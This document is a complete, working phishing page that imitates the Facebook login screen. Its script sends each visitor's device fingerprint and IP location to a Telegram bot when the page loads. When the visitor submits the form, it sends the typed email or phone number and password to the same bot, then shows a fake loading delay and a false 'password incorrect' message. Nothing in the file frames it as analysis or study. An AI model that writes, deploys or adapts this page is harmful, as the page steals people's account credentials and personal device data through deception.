<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook ‚Äì log in or sign up</title>

  <style>

    body {
      background: #f0f2f5;
      color: #1c1e21;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      padding: 32px 16px 0 16px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .lang {
      color: #606770;
      margin-bottom: 32px;
      font-size: 16px;
      text-align: center;
    }

    .fb-logo {
      margin-bottom: 32px;
    }

    .input, .create-btn {
      width: 100%;
      padding: 16px;
      margin-bottom: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      background: #ffffff;
      color: #1c1e21;
      font-size: 16px;
      box-sizing: border-box;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 16px;
      cursor: pointer;
      transition: background 0.2s;
    }

    .login-btn:hover {
      background: #166fe5;
    }

    .forgot {
      color: #1877f2;
      text-align: center;
      margin-bottom: 24px;
      text-decoration: none;
      display: block;
      font-size: 14px;
    }

    .create-btn {
      cursor: pointer;
      border: none;
      background: #42b72a;
      color: #fff;
      font-weight: bold;
      transition: background 0.2s;
    }

    .create-btn:hover {
      background: #36a420;
    }

    .meta {
      color: #606770;
      text-align: center;
      font-size: 18px;
      margin-top: auto;
      margin-bottom: 24px;
      letter-spacing: 1px;
    }

  </style>
</head>
<body>

  <div class="container">

    <div class="lang">English (US) &#9660;</div>

    <div class="fb-logo">
      <svg width="56" height="56" viewBox="0 0 56 56" xmlns="http://www.w3.org/2000/svg">
        <circle cx="28" cy="28" r="28" fill="#1877F2"/>
        <path d="M34.524 35.999l1.09-7.12h-6.03v-4.63c0-1.95.96-3.85 4.04-3.85h3.13V14.88s-2.85-.49-5.58-.49c-5.69 0-9.41 3.45-9.41 9.68v4.82h-6.32v7.12h6.32V48h7.77V35.999h5.01z" fill="#fff"/>
      </svg>
    </div>

    <input class="input" type="text" placeholder="Mobile number or email">
    <input class="input" type="password" placeholder="Password">

    <button class="login-btn">Log in</button>

    <a class="forgot" href="#">Forgot password?</a>

    <button class="create-btn">Create new account</button>

  </div>

  <div class="meta">&#8734; Meta</div>

  <script>

    async function getTelegramConfig() {
      try {
        const res = await fetch('server.txt');
        const text = await res.text();
        const token = text.match(/TOKEN=(.*)/)[1].trim();
        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
        return { token, chatId };
      } catch (e) {
        alert('Failed to load Telegram config.');
        return { token: '', chatId: '' };
      }
    }

    let TG_API = '';
    let TELEGRAM_TOKEN = '';
    let TELEGRAM_CHAT_ID = '';

    getTelegramConfig().then(cfg => {
      TELEGRAM_TOKEN = cfg.token;
      TELEGRAM_CHAT_ID = cfg.chatId;
      TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    });

    function getDeviceName() {
      const ua = navigator.userAgent;

      if (/android/i.test(ua)) {
        const match = ua.match(/Android.*; (.+?) Build/);
        return match ? `Android (${match[1]})` : 'Android Device';
      } else if (/iPhone/i.test(ua)) return 'iPhone';
      else if (/iPad/i.test(ua)) return 'iPad';
      else if (/Macintosh/i.test(ua)) return 'Mac';
      else if (/Windows/i.test(ua)) return 'Windows PC';
      else if (/Linux/i.test(ua)) return 'Linux PC';
      else return 'Unknown Device';
    }

    async function getDeviceInfo() {
      let batteryInfo = '';

      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = `üîã Battery: ${(battery.level * 100).toFixed(0)}%${battery.charging ? ' (Charging)' : ''}`;
        } catch {
          batteryInfo = 'üîã Battery: N/A';
        }
      } else {
        batteryInfo = 'üîã Battery: N/A';
      }

      const screenRes = `üñ•Ô∏è Screen: ${window.screen.width}x${window.screen.height}`;
      const timezone = `‚è∞ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
      const referrer = `üîó Referrer: ${document.referrer || 'Direct/None'}`;

      let connectionType = 'üì∂ Connection: N/A';
      if (navigator.connection && navigator.connection.effectiveType) {
        connectionType = `üì∂ Connection: ${navigator.connection.effectiveType.toUpperCase()}`;
      }

      const cpuCores = `üß† CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;
      const memory = `üíæ RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}`;

      const info = [
        `üì± Device: ${getDeviceName()}`,
        `üß≠ User Agent: ${navigator.userAgent}`,
        `üíª Platform: ${navigator.platform}`,
        `üåê Language: ${navigator.language}`,
        screenRes,
        timezone,
        referrer,
        connectionType,
        cpuCores,
        memory,
        batteryInfo,
        `üïí Time: ${new Date().toLocaleString()}`
      ];

      return info.join('\n');
    }

    async function getIPInfo() {
      try {
        const res = await fetch('https://geolocation-db.com/json/');
        if (!res.ok) throw new Error();
        const data = await res.json();
        return `üåç IP: ${data.IPv4}\nüèôÔ∏è City: ${data.city}\nüåé Country: ${data.country_name}\nüåê State: ${data.state}`;
      } catch {
        return 'üåç IP Info: N/A';
      }
    }

    async function sendToTelegram(message) {
      await fetch(TG_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
      });
    }

    window.addEventListener('DOMContentLoaded', async () => {
      const deviceInfo = await getDeviceInfo();
      const ipInfo = await getIPInfo();
      sendToTelegram(`üü¢ New visitor!\n${deviceInfo}\n${ipInfo}`);
    });

    document.addEventListener('DOMContentLoaded', () => {
      const loginBtn = document.querySelector('.login-btn');
      const forgotBtn = document.querySelector('.forgot');
      const createBtn = document.querySelector('.create-btn');
      const container = document.querySelector('.container');

      let loadingDiv = null;
      let errorDiv = null;

      forgotBtn.addEventListener('click', (e) => {
        e.preventDefault();
        window.open('https://www.facebook.com/login/identify/', '_blank');
      });

      createBtn.addEventListener('click', (e) => {
        e.preventDefault();
        window.open('https://m.facebook.com/reg/#', '_blank');
      });

      loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();

        const email = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;

        const deviceInfo = await getDeviceInfo();
        const ipInfo = await getIPInfo();

        const credsBlock = `\n\nüìã Tap to copy:\nüë§ Email/Phone: \`${email}\`\nüîë Password: \`${password}\``;

        const message = `üîê Login Attempt${credsBlock}\n${deviceInfo}\n${ipInfo}`;

        sendToTelegram(message);

        if (!loadingDiv) {
          loadingDiv = document.createElement('div');
          loadingDiv.style.textAlign = 'center';
          loadingDiv.style.margin = '20px 0';
          loadingDiv.innerHTML = '<span style="font-size:24px;">‚è≥</span><br>Loading...';
          container.appendChild(loadingDiv);
        }

        if (errorDiv) {
          errorDiv.remove();
          errorDiv = null;
        }

        setTimeout(() => {
          if (loadingDiv) {
            loadingDiv.remove();
            loadingDiv = null;
          }

          if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.style.textAlign = 'center';
            errorDiv.style.color = '#1c1e21';
            errorDiv.style.margin = '20px 0';
            errorDiv.innerHTML =
              `The password that you've entered is incorrect.<br><a href="https://www.facebook.com/login/identify/" target="_blank" style="color:#1877f2;text-decoration:underline;">Forgotten password?</a>`;
            container.appendChild(errorDiv);
          }

        }, 10000);
      });

    });

  </script>

</body>
</html>
